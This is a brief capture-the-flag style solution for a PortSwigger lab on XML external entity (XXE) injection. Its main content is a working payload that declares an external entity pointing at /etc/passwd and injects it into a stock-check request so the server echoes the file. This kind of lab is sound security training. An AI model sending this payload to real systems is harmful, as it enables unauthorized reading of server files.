# Lab 01 — Exploiting XXE using external entities to retrieve files

> **Practitioner** · [Official lab](https://portswigger.net/web-security/xxe/exploiting-xxe-to-retrieve-files)

**Entry point:** `POST /product/stock` — the XML body is parsed and the
`productId` value is echoed in the response.

## Solution

1. Capture the stock check:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

2. Define an external entity and reference it:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

3. The response echoes the parsed entity — `/etc/passwd` contents appear —
   lab solved.

## Notes

Classic classic-XXE: user-controlled XML + external entity resolution +
echo of the parsed value in the response.
